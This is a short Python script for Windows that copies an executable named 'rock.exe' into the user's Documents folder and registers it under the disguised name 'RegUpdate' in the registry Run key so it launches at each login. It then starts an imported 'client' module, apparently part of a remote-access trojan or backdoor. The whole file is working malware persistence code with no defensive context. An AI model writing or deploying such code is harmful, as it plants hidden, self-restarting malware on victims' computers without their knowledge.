import shutil
import winreg
import os
import client

def main():
    if os.name != 'nt':
        return
    
    src = os.getcwd().strip('\n') + "\\rock.exe"
    dest = f"C:\\Users\\{os.getlogin()}\\Documents\\rock.exe"

    if not os.path.exists(dest):
        shutil.copyfile(src, dest)

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, 'RegUpdate', 0, winreg.REG_SZ, dest)
        key.Close()

if __name__ == "__main__":
    main()

    # Client.py run method
    client.run()